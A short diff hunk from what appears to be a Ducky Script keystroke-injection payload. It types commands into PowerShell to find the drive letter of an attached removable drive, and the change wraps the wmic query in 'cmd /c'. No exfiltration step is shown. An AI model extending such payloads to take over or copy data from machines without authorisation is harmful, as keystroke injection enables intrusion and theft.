@@ -24,7 +24,7 @@ DELAY 800
 STRING powershell
 ENTER
 DELAY 800
-STRING $a = wmic logicaldisk where drivetype=2 get deviceid
+STRING $a = cmd /c "wmic logicaldisk where drivetype=2 get deviceid"
 ENTER
 DELAY 800
 STRING $b[2]
